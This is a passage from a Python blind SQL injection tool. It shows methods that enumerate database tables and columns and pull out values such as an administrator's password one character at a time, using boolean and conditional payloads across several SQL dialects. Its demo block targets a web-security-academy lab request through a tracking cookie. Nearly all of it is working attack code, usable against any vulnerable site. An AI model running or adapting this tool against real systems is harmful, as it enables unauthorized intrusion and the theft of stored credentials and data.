        def payload_for(kind, a, b=None):
            if kind == 'len':
                op, val = a, b
                return self._enum_cond_payload(f"{length_expr}{op}{val}", from_clause)
            if kind == 'char':
                pos, (op, val) = a, b
                ax = d["ascii"].format(q=col, pos=pos)
                return self._enum_cond_payload(f"{ax}{op}{val}", from_clause)
            if kind == 'char_eq':
                pos, (op, ch) = a, b
                sx = d["substr"].format(q=col, pos=pos)
                return self._enum_cond_payload(f"{sx}='{ch}'", from_clause)

        n = self._find_length(payload_for, max_length)
        if n == 0:
            return ""
        self.log(f"    length = {n}")
        return self._extract_chars(payload_for, n)

    def _pick_candidate(self, kind, tbl=None, candidates=None):
        """Walk candidate shapes for `kind` ('tables'|'columns'); return the first
        whose row-0 query validates. `candidates` overrides the built-in list."""
        cand_list = candidates or ENUM_CANDIDATES.get(self._dialect_name, {}).get(kind, [])
        if not cand_list:
            self.log(f"[!] no {kind} enumeration candidates for {self._dialect_name}")
            return None
        for c in cand_list:
            self._check_stop()
            from0 = c["from"].replace("{row}", "0").replace("{rownum}", "1")
            if tbl is not None:
                from0 = from0.replace("{tbl}", tbl)
            self.log(f"[*] validating candidate: {c['col']} {from0}")
            if self._validate_candidate(c["col"], from0):
                self.log(f"[+] candidate works: {c['col']} {c['from']}")
                return c
            self.log("[!] candidate failed validation, trying next...")
        self.log(f"[!] no {kind} candidate passed validation — check DB type / template")
        return None

    def get_table_names(self, limit=10):
        self.detect_database()
        self.log("[*] enumerating table names (flat candidate mode)...")
        cand = self._pick_candidate("tables", candidates=self.enum_tables_override)
        if not cand:
            return []
        tables = []
        for i in range(limit):
            self._check_stop()
            from_i = cand["from"].replace("{row}", str(i)).replace("{rownum}", str(i + 1))
            name = self._extract_flat_enum(cand["col"], from_i, max_length=64)
            if not name:
                break
            tables.append(name)
            self.log(f"[+] table: {name}")
        return tables

    def get_columns(self, table_name, limit=30):
        self.detect_database()
        self.log(f"[*] enumerating columns of {table_name} (flat candidate mode)...")
        cand = self._pick_candidate("columns", tbl=table_name,
                                    candidates=self.enum_columns_override)
        if not cand:
            return []
        cols = []
        for i in range(limit):
            self._check_stop()
            from_i = (cand["from"].replace("{tbl}", table_name)
                      .replace("{row}", str(i)).replace("{rownum}", str(i + 1)))
            name = self._extract_flat_enum(cand["col"], from_i, max_length=64)
            if not name:
                break
            cols.append(name)
            self.log(f"[+] column: {name}")
        return cols

    def extract_data(self, table_name, column_name, limit=5):
        self.detect_database()
        d = self._dialect()

        # Self-contained mode: the row-targeting lives INSIDE the condition as a
        # scalar subquery, so the template stays generic (e.g. FROM dual) and there
        # is no separate WHERE field to duplicate. Each condition is:
        #   (SELECT <expr> FROM <table> [WHERE <filter>] [paging])>N
        # which returns one value and compares cleanly.
        filt = self.where_clause  # optional row filter, e.g. username='administrator'

        if filt:
            # Known single row — no paging needed.
            self.log(f"[*] extracting {column_name} FROM {table_name} "
                     f"WHERE {filt} ...")
            val = self._extract_scalar_subquery(column_name, table_name, filt, None,
                                                max_length=128)
            if val:
                self.log(f"[+] {column_name} = {val}")
                return [val]
            self.log("[!] extraction returned nothing")
            return []

        # No filter — page through rows, still self-contained.
        self.log(f"[*] extracting {table_name}.{column_name} (rows 0..{limit-1})...")
        out = []
        for i in range(limit):
            self._check_stop()
            val = self._extract_scalar_subquery(column_name, table_name, None, i,
                                                max_length=128)
            if not val:
                break
            out.append(val)
            self.log(f"[+] [{i}] {val}")
        return out

    def _wrap_scalar(self, inner_expr, table, where, row):
        """Build a scalar subquery returning ONE value:
           (SELECT <inner_expr> FROM <table> [WHERE <where>] [paging-for-row])
        The whole thing is then compared (>N / >=N) inside the WHEN — keeping the
        outer template generic (FROM dual)."""
        d = self._dialect()
        sql = f"SELECT {inner_expr} FROM {table}"
        if where:
            sql += f" WHERE {where}"
        elif row is not None:
            if self._dialect_name == "oracle":
                sql += f" OFFSET {row} ROWS FETCH NEXT 1 ROWS ONLY"
            else:
                sql += f" {d['limit'].format(n=row)}"
        return f"({sql})"

    def _extract_scalar_subquery(self, column, table, where, row, max_length=128):
        """Length-first + per-char search where each condition is a self-contained
        scalar subquery — no separate FROM/WHERE on the template. Uses the unified
        engine (sequential or threaded per settings)."""
        d = self._dialect()

        def payload_for(kind, a, b=None):
            if kind == 'len':
                op, val = a, b
                inner = d["length"].format(q=column)
                scalar = self._wrap_scalar(inner, table, where, row)
                return self._cond_payload(f"{scalar}{op}{val}")
            if kind == 'char':
                pos, (op, val) = a, b
                inner = d["ascii"].format(q=column, pos=pos)
                scalar = self._wrap_scalar(inner, table, where, row)
                return self._cond_payload(f"{scalar}{op}{val}")
            if kind == 'char_eq':
                pos, (op, ch) = a, b
                inner = d["substr"].format(q=column, pos=pos)
                scalar = self._wrap_scalar(inner, table, where, row)
                return self._cond_payload(f"{scalar}='{ch}'")

        n = self._find_length(payload_for, max_length)
        if n == 0:
            return ""
        self.log(f"    length = {n}")
        return self._extract_chars(payload_for, n)

    # ── DIRECT flat extraction (no nested subquery) ──────────────────────────────
    def _extract_flat(self, expr, max_length=128):
        """Extract a scalar referenced by a BARE expression (e.g. a column name
        like 'password'). Produces flat conditions the template wraps with its own
        FROM/WHERE: LENGTH(password)>=N and ASCII(SUBSTR(password,pos,1))>N.
        This is the shape used in Oracle/MSSQL conditional-error exploitation."""
        d = self._dialect()
        # length first
        length_expr = d["length"].format(q=expr)
        lo, hi = 0, max_length
        while lo < hi:
            self._check_stop()
            mid = (lo + hi + 1) // 2
            if self._is_true(self._cond_payload(f"{length_expr}>={mid}")):
                lo = mid
            else:
                hi = mid - 1
        n = lo
        if n == 0:
            return ""
        self.log(f"    length = {n}")
        result = []
        for pos in range(1, n + 1):
            self._check_stop()
            ascii_expr = d["ascii"].format(q=expr, pos=pos)
            a, b = 32, 126
            while a < b:
                self._check_stop()
                mid = (a + b) // 2
                if self._is_true(self._cond_payload(f"{ascii_expr}>{mid}")):
                    a = mid + 1
                else:
                    b = mid
            ch = chr(a)
            result.append(ch)
            current = "".join(result)
            self.log(f"    [{pos}/{n}] {current}")
            self.results.append({"pos": pos, "char": ch, "result": current})
        return "".join(result)


if __name__ == "__main__":
    raw = """GET /filter?category=Gifts HTTP/2.0
Host: example.web-security-academy.net
User-Agent: Mozilla/5.0
Cookie: TrackingId=abc123; session=xyz"""
    inj = BlindSQLInjector(raw, "TrackingId", "boolean", "Welcome", "auto")
    if inj._test_payload("' AND '1'='1"):
        print("injectable; tables:", inj.get_table_names())
    else:
        print("injection not confirmed")